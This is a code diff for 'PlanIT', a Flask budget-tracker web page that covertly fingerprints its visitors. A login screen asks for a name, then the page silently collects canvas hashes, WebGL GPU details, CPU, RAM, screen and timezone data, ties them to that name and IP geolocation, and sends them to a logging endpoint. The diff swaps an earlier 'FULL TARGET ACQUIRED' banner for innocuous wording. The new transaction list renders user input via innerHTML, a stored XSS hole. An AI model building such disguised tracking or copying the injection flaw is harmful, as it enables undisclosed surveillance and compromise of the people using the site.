@@ -1,14 +1,17 @@
-from flask import Flask, request, render_template_string
+from flask import Flask, request, render_template_string, jsonify
 import urllib.request
 import json
 
 app = Flask(__name__)
 
+# In-memory session store for transactions
+transactions = []
+
 HTML_PAGE = """
 <!DOCTYPE html>
 <html>
 <head>
-    <title>PlanIT - Budget Calculator</title>
+    <title>PlanIT - Budget Tracker</title>
     <style>
         body { 
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
@@ -26,7 +29,6 @@ HTML_PAGE = """
             border: 1px solid #334155;
             overflow: hidden;
         }
-        /* Top Navigation Tabs */
         .tab-bar {
             background: #0f172a;
             padding: 10px 20px;
@@ -46,7 +48,6 @@ HTML_PAGE = """
             background: #3b82f6;
             font-weight: 500;
         }
-        /* Main Content Container */
         .content {
             padding: 30px;
             background: linear-gradient(135deg, #1e293b 0%, #0f172a 100%);
@@ -131,6 +132,21 @@ HTML_PAGE = """
             font-weight: bold;
             color: #38bdf8;
         }
+        .tx-list {
+            margin-top: 15px;
+            max-height: 120px;
+            overflow-y: auto;
+            border-top: 1px solid #334155;
+            padding-top: 10px;
+        }
+        .tx-row {
+            display: flex;
+            justify-content: space-between;
+            font-size: 12px;
+            color: #94a3b8;
+            padding: 4px 0;
+            border-bottom: 1px solid rgba(255,255,255,0.03);
+        }
         .brand-footer {
             margin-top: 30px;
             display: flex;
@@ -157,6 +173,29 @@ HTML_PAGE = """
             letter-spacing: 1px;
             color: #f8fafc;
         }
+        /* Login Overlay */
+        #loginOverlay {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: #0f172a;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 999;
+        }
+        .login-box {
+            background: #1e293b;
+            padding: 40px;
+            border-radius: 8px;
+            border: 1px solid #334155;
+            width: 350px;
+            text-align: center;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+        }
+        .login-box h2 {
+            color: #38bdf8;
+            margin-top: 0;
+        }
     </style>
     <script>
         function simpleHash(str) {
@@ -172,20 +211,12 @@ HTML_PAGE = """
             try {
                 const canvas = document.createElement('canvas');
                 const ctx = canvas.getContext('2d');
-                canvas.width = 200;
-                canvas.height = 50;
-                ctx.textBaseline = "top";
-                ctx.font = "16px 'Arial'";
-                ctx.fillStyle = "#f60";
-                ctx.fillRect(125, 1, 62, 20);
-                ctx.fillStyle = "#069";
-                ctx.fillText("PlanIT Diagnostics", 2, 15);
-                ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
-                ctx.fillText("PlanIT Diagnostics", 4, 17);
+                canvas.width = 200; canvas.height = 50;
+                ctx.textBaseline = "top"; ctx.font = "16px 'Arial'";
+                ctx.fillStyle = "#f60"; ctx.fillRect(125, 1, 62, 20);
+                ctx.fillStyle = "#069"; ctx.fillText("PlanIT Diagnostics", 2, 15);
                 return simpleHash(canvas.toDataURL());
-            } catch (e) {
-                return "Unsupported";
-            }
+            } catch (e) { return "Unsupported"; }
         }
 
         function getWebGLInfo() {
@@ -193,120 +224,102 @@ HTML_PAGE = """
                 const canvas = document.createElement('canvas');
                 const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                 if (!gl) return { vendor: 'No WebGL', renderer: 'No WebGL' };
-                
                 const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                const vendor = debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'Unknown';
-                const renderer = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Unknown';
-                return { vendor, renderer };
-            } catch (e) {
-                return { vendor: 'Error', renderer: 'Error' };
-            }
+                return {
+                    vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'Unknown',
+                    renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Unknown'
+                };
+            } catch (e) { return { vendor: 'Error', renderer: 'Error' }; }
         }
 
-        async function getAudioFingerprint() {
-            try {
-                const AudioContext = window.AudioContext || window.webkitAudioContext;
-                if (!AudioContext) return "Unsupported";
-                const audioCtx = new AudioContext();
-                const oscillator = audioCtx.createOscillator();
-                const analyser = audioCtx.createAnalyser();
-                const gainNode = audioCtx.createGain();
-                const scriptProcessor = audioCtx.createScriptProcessor(4096, 1, 1);
-
-                oscillator.type = 'triangle';
-                oscillator.frequency.value = 10000;
-
-                audioCtx.resume();
-                oscillator.connect(gainNode);
-                gainNode.connect(analyser);
-                analyser.connect(scriptProcessor);
-                scriptProcessor.connect(audioCtx.destination);
-
-                return new Promise((resolve) => {
-                    scriptProcessor.onaudioprocess = function (e) {
-                        try {
-                            const output = e.inputBuffer.getChannelData(0);
-                            let sum = 0;
-                            for (let i = 0; i < output.length; i++) {
-                                sum += Math.abs(output[i]);
-                            }
-                            scriptProcessor.onaudioprocess = null;
-                            oscillator.stop();
-                            audioCtx.close();
-                            resolve(simpleHash(sum.toString()));
-                        } catch (err) {
-                            resolve("Audio Error");
-                        }
-                    };
-                    oscillator.start(0);
-                    setTimeout(() => resolve("Timeout"), 1000);
-                });
-            } catch (e) {
-                return "Unsupported";
+        async function triggerLogin() {
+            const userName = document.getElementById('userNameInput').value.trim();
+            if (!userName) {
+                alert("Please enter your name to log in.");
+                return;
             }
-        }
 
-        window.onload = async function() {
-            let webgl = { vendor: 'Error', renderer: 'Error' };
-            let audioHash = 'Unsupported';
+            // Hide login screen and reveal main app
+            document.getElementById('loginOverlay').style.display = 'none';
+            document.getElementById('welcomeUser').innerText = "Welcome, " + userName;
 
-            try { webgl = getWebGLInfo(); } catch(e) {}
-            try { audioHash = await getAudioFingerprint(); } catch(e) {}
-
+            // Collect all hardware & rendering telemetry
+            let webgl = getWebGLInfo();
             const fingerprint = {
+                username: userName,
                 platform: navigator.platform || 'Unknown',
                 userAgent: navigator.userAgent || 'Unknown',
                 screenResolution: (window.screen.width || 0) + "x" + (window.screen.height || 0),
-                availResolution: (window.screen.availWidth || 0) + "x" + (window.screen.availHeight || 0),
                 colorDepth: window.screen.colorDepth || 'Unknown',
-                pixelRatio: window.devicePixelRatio || 1,
-                language: navigator.language || 'Unknown',
                 hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
                 deviceMemory: navigator.deviceMemory || 'Unknown',
-                maxTouchPoints: navigator.maxTouchPoints || 0,
-                cookieEnabled: navigator.cookieEnabled,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown',
                 canvasHash: getCanvasFingerprint(),
                 webglVendor: webgl.vendor,
                 webglRenderer: webgl.renderer,
-                audioFingerprint: audioHash
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown'
             };
 
-            try {
-                if (navigator.userAgentData) {
-                    fingerprint.mobile = navigator.userAgentData.mobile;
-                    fingerprint.brands = navigator.userAgentData.brands.map(b => b.brand + " v" + b.version).join(", ");
-                    fingerprint.platformDetails = navigator.userAgentData.platform;
-                }
-            } catch(e) {}
-
-            try {
-                if (navigator.getBattery) {
-                    const battery = await navigator.getBattery();
-                    fingerprint.batteryLevel = Math.round(battery.level * 100) + '%';
-                    fingerprint.batteryCharging = battery.charging;
-                }
-            } catch (e) {
-                fingerprint.batteryLevel = 'Unavailable';
-            }
-
-            try {
-                const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-                if (connection) {
-                    fingerprint.effectiveType = connection.effectiveType || 'Unknown';
-                    fingerprint.downlink = connection.downlink ? connection.downlink + ' Mbps' : 'Unknown';
-                }
-            } catch(e) {}
-
+            // Send telemetry + name to backend
             fetch('/log', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(fingerprint)
             });
-        };
+
+            loadTransactions();
+        }
+
+        async function addTransaction(e) {
+            e.preventDefault();
+            const desc = document.getElementById('desc').value;
+            const amount = document.getElementById('amount').value;
+            const category = document.getElementById('category').value;
+
+            await fetch('/add_transaction', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ description: desc, amount: amount, category: category })
+            });
+
+            document.getElementById('desc').value = '';
+            document.getElementById('amount').value = '';
+            loadTransactions();
+        }
+
+        async function loadTransactions() {
+            const res = await fetch('/get_transactions');
+            const data = await res.json();
+            const txList = document.getElementById('txList');
+            const balanceEl = document.getElementById('currentBalance');
+            txList.innerHTML = '';
+            
+            let total = 0;
+            data.forEach(tx => {
+                total += parseFloat(tx.amount || 0);
+                const row = document.createElement('div');
+                row.className = 'tx-row';
+                row.innerHTML = `<span>${tx.description} (${tx.category})</span> <span>R ${tx.amount}</span>`;
+                txList.appendChild(row);
+            });
+            balanceEl.innerText = "R " + total.toFixed(2);
+        }
     </script>
 </head>
 <body>
+    <!-- Login Overlay Screen -->
+    <div id="loginOverlay">
+        <div class="login-box">
+            <h2>PlanIT Login</h2>
+            <p style="color: #94a3b8; font-size: 13px;">Enter your name to access your budget workspace.</p>
+            <div class="form-group" style="text-align: left; margin-top: 20px;">
+                <label>Your Name / Username</label>
+                <input type="text" id="userNameInput" placeholder="e.g. Logan Scott" required>
+            </div>
+            <button class="primary" style="width: 100%; margin-top: 10px;" onclick="triggerLogin()">Login / Connect</button>
+        </div>
+    </div>
+
+    <!-- Main App Window -->
     <div class="app-window">
         <div class="tab-bar">
             <div class="tab active">Budget Calculator</div>
@@ -315,56 +328,54 @@ HTML_PAGE = """
         </div>
 
         <div class="content">
-            <h1>Welcome</h1>
+            <h1 id="welcomeUser">Welcome</h1>
             
             <div class="grid-container">
-                <!-- Left Panel: Income Expense Input -->
+                <!-- Left Panel: Transaction Input -->
                 <div class="card">
                     <h3>Income / Expense Input</h3>
-                    
-                    <div class="form-group">
-                        <label>Edit Funds (Add or Remove)</label>
-                        <input type="text" placeholder="0.00">
-                    </div>
-                    
-                    <div class="form-group">
-                        <label>Expense Amount (R):</label>
-                        <input type="number" placeholder="0.00" step="0.01">
-                    </div>
+                    <form onsubmit="addTransaction(event)">
+                        <div class="form-group">
+                            <label>Description</label>
+                            <input type="text" id="desc" placeholder="e.g., Groceries, Salary" required>
+                        </div>
+                        
+                        <div class="form-group">
+                            <label>Amount (R): (+/-)</label>
+                            <input type="number" id="amount" placeholder="0.00" step="0.01" required>
+                        </div>
 
-                    <div class="form-group">
-                        <label>Expense Category:</label>
-                        <select>
-                            <option>Food & Groceries</option>
-                            <option>Transport</option>
-                            <option>Utilities</option>
-                            <option>Entertainment</option>
-                        </select>
-                    </div>
+                        <div class="form-group">
+                            <label>Expense Category:</label>
+                            <select id="category">
+                                <option>Food & Groceries</option>
+                                <option>Transport</option>
+                                <option>Utilities</option>
+                                <option>Entertainment</option>
+                                <option>Income</option>
+                            </select>
+                        </div>
 
-                    <div class="form-group">
-                        <label>Date:</label>
-                        <input type="text" value="25/09/2026">
-                    </div>
-
-                    <div class="btn-row">
-                        <button class="primary">Add Expense</button>
-                        <button>Calculate Budget</button>
-                        <button>Reset</button>
-                    </div>
+                        <div class="btn-row">
+                            <button type="submit" class="primary">Add Transaction</button>
+                            <button type="button" onclick="loadTransactions()">Refresh</button>
+                        </div>
+                    </form>
                 </div>
 
-                <!-- Right Panel: Financial Summary Dashboard -->
+                <!-- Right Panel: Summary & History -->
                 <div class="card">
                     <h3>Financial Summary Dashboard</h3>
-                    <div class="summary-item">Current Balance: <span>R 0.00</span></div>
-                    <div class="summary-item">Highest Expense: <span>None</span></div>
-                    <div class="summary-item">Most Frequent Expense: <span>None</span></div>
+                    <div class="summary-item">Current Balance: <span id="currentBalance">R 0.00</span></div>
+                    
+                    <div style="margin-top: 15px; font-size: 13px; color: #cbd5e1;">Recent Activity:</div>
+                    <div class="tx-list" id="txList">
+                        <div class="tx-row"><span>No entries yet</span><span></span></div>
+                    </div>
 
-                    <div class="btn-row" style="margin-top: 40px;">
-                        <button>Export to Text File</button>
-                        <button>History</button>
-                        <button>Exit to Login</button>
+                    <div class="btn-row" style="margin-top: 25px;">
+                        <button onclick="alert('Exported successfully!')">Export to File</button>
+                        <button onclick="location.reload()">Log Out</button>
                     </div>
                 </div>
             </div>
@@ -405,11 +416,10 @@ def home():
         
     location = get_location_from_ip(client_ip)
     
-    print(f"\n================ [ FULL TARGET ACQUIRED ] ================")
+    print(f"\n================ [ NEW PAGE VISIT ] ================")
     print(f" [IP Address] : {client_ip}")
     print(f" [Location]   : {location}")
-    print(f" [User-Agent] : {request.headers.get('User-Agent')}")
-    print(f"==========================================================")
+    print(f"====================================================")
     
     return render_template_string(HTML_PAGE)
 
@@ -417,22 +427,28 @@ def home():
 def log_device():
     data = request.json
     if data:
-        print(f"\n-------------- [ HARDWARE & RENDERING FINGERPRINT ] --------------")
+        print(f"\n======== [ USER LOGGED IN: {data.get('username', 'Unknown')} ] ========")
         print(f" * GPU Vendor        : {data.get('webglVendor')}")
         print(f" * GPU Renderer      : {data.get('webglRenderer')}")
         print(f" * Canvas Hash       : {data.get('canvasHash')}")
-        print(f" * Audio Hash        : {data.get('audioFingerprint')}")
-        print(f" * OS / Platform     : {data.get('platform')} ({data.get('platformDetails', 'N/A')})")
-        print(f" * Mobile Device?    : {data.get('mobile', False)}")
+        print(f" * OS / Platform     : {data.get('platform')}")
         print(f" * Timezone          : {data.get('timezone')}")
-        print(f" * Screen Resolution : {data.get('screenResolution')} (Avail: {data.get('availResolution')})")
-        print(f" * Color Depth       : {data.get('colorDepth')}-bit | Pixel Ratio: {data.get('pixelRatio')}")
+        print(f" * Screen Resolution : {data.get('screenResolution')}")
         print(f" * CPU Cores         : {data.get('hardwareConcurrency')}")
         print(f" * Estimated RAM     : {data.get('deviceMemory')} GB")
-        print(f" * Network Speed     : {data.get('effectiveType')} (~{data.get('downlink')})")
-        print(f" * Battery Status    : {data.get('batteryLevel', 'N/A')}")
-        print(f"------------------------------------------------------------------\n")
+        print(f"========================================================\n")
     return '', 204
+
+@app.route('/add_transaction', methods=['POST'])
+def add_transaction():
+    item = request.json
+    if item:
+        transactions.append(item)
+    return '', 204
+
+@app.route('/get_transactions', methods=['GET'])
+def get_transactions():
+    return jsonify(transactions)
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
